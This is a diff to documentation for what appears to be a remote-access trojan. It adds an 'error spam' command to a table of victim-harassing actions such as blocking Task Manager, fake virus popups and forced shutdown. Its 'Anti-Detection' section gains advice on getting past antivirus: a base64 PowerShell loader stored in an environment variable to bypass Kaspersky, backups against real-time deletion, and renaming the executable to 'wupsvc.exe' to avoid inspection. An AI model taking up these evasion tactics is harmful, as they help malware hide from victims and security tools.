@@ -71,6 +71,7 @@ The loader:
 | Block Task Manager | `block_taskmgr` |
 | Fake virus popup | `fake_virus` |
 | Fake error popup | `fake_error` |
+| Error spam (toggle) | `error_spam` |
 | Rick roll | `rick` |
 | Shutdown | `shutdown` |
 | Disconnect | `exit` |
@@ -94,6 +95,8 @@ The loader:
 ## Anti-Detection
 
 - **Kaspersky** detects compiled C loaders — PowerShell approach bypasses (no binary, just base64 in env var)
+- `.py` files may be deleted by real-time protection — always keep `(local)` backup
+- `wupsvc.exe` rename evades casual inspection
 
 ## Architecture
 
